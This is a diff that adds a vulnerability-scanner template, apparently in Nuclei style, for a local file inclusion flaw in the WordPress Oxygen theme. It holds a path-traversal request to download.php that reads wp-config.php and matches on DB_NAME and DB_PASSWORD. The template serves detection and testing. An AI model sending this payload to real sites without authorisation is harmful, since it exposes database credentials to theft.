@@ -1,0 +1,26 @@
+id: wp-oxygen-theme-lfi
+brief:
+    title: WordPress Oxygen-Theme - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Oxygen-Theme has a local file inclusion vulnerability via the 'file' parameter of 'download.php'.
+    label:
+        - wordpress
+        - wp-theme
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/themes/oxygen-theme/download.php?file=../../../wp-config.php'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
